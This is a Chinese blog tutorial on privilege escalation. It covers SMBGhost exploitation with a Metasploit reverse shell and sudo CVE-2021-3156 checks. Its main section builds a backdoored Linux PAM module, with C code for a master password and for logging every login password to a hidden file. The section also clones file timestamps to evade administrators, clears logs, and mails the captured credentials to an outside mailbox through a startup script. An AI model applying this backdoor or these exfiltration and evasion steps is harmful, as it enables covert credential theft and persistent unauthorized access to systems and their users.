---
title: 手工提权
author: Spade-Z
top: false
cover: false
toc: true
mathjax: false
img: >-
  https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%830.png
coverImg: >-
  https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%831.png
summary: 通常情况下我们通过 Web 服务获取到站点的 Webshell 权限都是普通用户的权限，这个时候能做的事情非常的少，所以我们需要提权来进行扩大战果。
tags: 
    - 工具 
    - Windows提权 
    - Linux提权
categories: 
    - 系统安全
abbrlink: 24efcaff
date: 2020-12-5 09:28:46
password:
---


# 一、Window10 提权漏洞

漏洞复现
靶机：win10虚拟机  ip：192.168.216.128(防火墙关闭)
攻击机：kali虚拟机  ip：192.168.202.130

## 1:检测系统是否存在漏洞
> git下载地址[传送门](https://github.com/ollypwn/SMBGhost)

用法：python3 scanner.py 目标ip
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%831.png)

目标存在该漏洞
## 2:提权POC提权
POC下载地址[传送门](https://github.com/chompie1337/SMBGhost_RCE_Po)
- 第一步：msf生成反向连接木马：
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%832.png)
- 第二步：生成的exploit.py 生成的code，替换到exploit.py的USER_PAYLOAD参数，并把参数buf改为USER_PAYLOAD。
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%833.png)
- 第三步：启动msf
配置监听
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%834.png)
- 第四步：运行poc，自动建立连接
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%835.png)
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%836.png)
查看当前用户权限
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%837.png)
如果不是system权限可以使用msf中的getsystem进行一下提权，也可以使用对应漏洞的提权文件
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%838.png)
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%839.png)
执行完提权文件cve-2020-0796-local.exe后可以看到成功提权到system权限

# 二、Linux sudo提权漏洞

漏洞编号：CVE-2021-3156
漏洞级别：高危
受影响版本：
		sudo: 1.8.2 - 1.8.31p2
        sudo: 1.9.0 - 1.9.5p1
检测方法：
    以非root用户登录系统，并运行如下命令：
    sudoedit -s /
-   如果响应一个以sudoedit:开头的报错，那么表明存在漏洞。
-   如果响应一个以usage:开头的报错，那么表明补丁已经生效。
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8310.png)
POC利用
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8311.png)
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8312.png)

# 三、自动劫持root密码并转发密码到邮箱

## 1.过PAM认证模块劫持密码
思路：在 xuegod63 上安装一个打了后门补丁的 PAM 认证模块，当用户来连接时，直接把密码记录下来。然后使用脚本发给我们的邮箱中
- 查看pam版本
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8313.png)
下载对应版本软件包

## 2.安装gcc和pam依赖
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8314.png)

## 3.安装PAM认证模块
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8315.png)
- 修改源码，在源码中添加后门
<pre style="background-color: #F0F8FF;">
[root@localhost Linux-PAM-1.1.8]# vim modules/pam_unix/pam_unix_auth.c
180 retval = _unix_verify_password(pamh, name, p, ctrl);
在 180 行下新增内容如下：
if(strcmp(p,"1234567")==0){
return PAM_SUCCESS;
}
if(retval==PAM_SUCCESS){
FILE *fp;
fp = fopen("/tmp/.logs","a");
fprintf(fp,"%s->%s\n",name,p);
fclose(fp);
}
</pre>
    1234567 是 backdoor 密码
    /tmp/.logs 记录系统登录密码
- 解决 64 位系统编译时遇到 yywrap()函数未定义问题
<pre style="background-color: #F0F8FF;">
[root@localhost Linux-PAM-1.1.8]# vi conf/pam_conv1/pam_conv_l.c
6 /* A lexical scanner generated by flex */
第六行下插入代码
7 int yywrap(){return 1;}
[root@localhost Linux-PAM-1.1.8]# vi doc/specs/parse_l.c
6 /* A lexical scanner generated by flex */
第六行下插入代码
7 int yywrap(){return 1;}
</pre>
- 配置 PAM 以下都是默认参数，因为安装了 flex，需要手工指定路径。
<pre style="background-color: #F0F8FF;">
[root@localhost Linux-PAM-1.1.8]# ./configure --prefix=/user --exec-prefix=/usr --localstatedir=/var --sysconfdir=/etc --disable-selinux --with-libiconv-prefix=/usr
[root@localhost Linux-PAM-1.1.8]# make
</pre>
    ![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8316.png)
- 安装编译好的PAM模块
`[root@localhost Linux-PAM-1.1.8]# cd /lib64/security/`
- 备份原始版本
`[root@localhost security]# mv pam_unix.so{,bak}`
-  覆盖系统现有pam
`[root@localhost security]# cp /root/Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so /lib64/security/`
- 克隆原始文件时间，防止时间戳发生改变被管理员检测到
    ![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8317.png)
    ![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8318.png)
- 新建Xshell终端窗口
    ![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8319.png)
    密码成功记录
    清除系统登陆记录
`[root@localhost security]# rm -rf /tmp/.logs`
- 测试后门密码登陆
    ![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8320.png)
    ![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8321.png)
    ![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8322.png)
## 3.自动发送邮件
- （1）使用 mail.rc 实现发邮件
<pre style="background-color:#F0F8FF;">
[root@xuegod63 ~]# vim /etc/mail.rc #在此文件最后插入以下内容：
set from=15595243411@163.com smtp=smtp.163.com
set smtp-auth-user=15595243411 smtp-auth-password=PASSWORD smtp-auth=login
注：
set from=15595243411@163.com #指定发件人的邮箱，这里就写成和收件人的邮箱一样。
set smtp-auth-user=15595243411 #写自己发件人的邮箱帐号
smtp-auth-password=PASSWORD #写自己发件人的邮箱的授权码
</pre>
- （2）配置 163 邮箱，开启 pop3/smtp 服务
- （3）测试邮件发送
`[root@localhost ~]# mail -s "demo title" 15595243411@163.com < /tmp/.logs`
    查看
    ![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8323.png)
- （4）编写 shell 脚本自动发邮件，邮件的主题是服务器的 IP 地址
    ![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8324.png)
- （5）测试
`[root@localhost ~]# /bin/zipmail`
    ![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8325.png)

## 4.实现当用户通过 ssh 登录系统后，自动发邮件
- 安装inotify
    ![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8326.png)
    ![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8327.png)
<pre style="background-color: #F0F8FF;">
[root@localhost inotify-tools-3.13]# make  -j 4
[root@localhost inotify-tools-3.13]# make install
</pre>
-  编写出发时自动发邮件脚本
    ![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8328.png)
    ![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8329.png)
- 设置开机启动zipmail脚本
<pre style="background-color: #F0F8FF;">
[root@localhost inotify-tools-3.13]# vi /etc/rc.local
#在此文件的最后插入以下内容。
/bin/zipmail &
</pre>
- 测试
`[root@localhost inotify-tools-3.13]# bash /etc/rc.local`
    Xshell退出重连一下
    ![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8330.png)
- 查看一下进程
    ![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8331.png)